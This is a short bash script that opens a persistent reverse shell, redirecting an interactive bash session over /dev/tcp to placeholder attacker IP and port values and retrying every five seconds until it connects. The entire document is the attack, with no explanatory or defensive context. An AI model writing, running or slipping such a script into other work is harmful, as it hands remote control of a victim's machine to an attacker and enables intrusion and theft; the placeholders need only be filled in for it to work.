#!/bin/bash

attacker_ip="attacker_ip"
attacker_port=0000

while true; do
    /bin/bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1
    if [ $? -ne 0 ]; then
        echo "Connection failed. Retrying in 5 seconds..."
        sleep 5
    else
        echo "Connection established. Exiting loop."
        break
    fi
done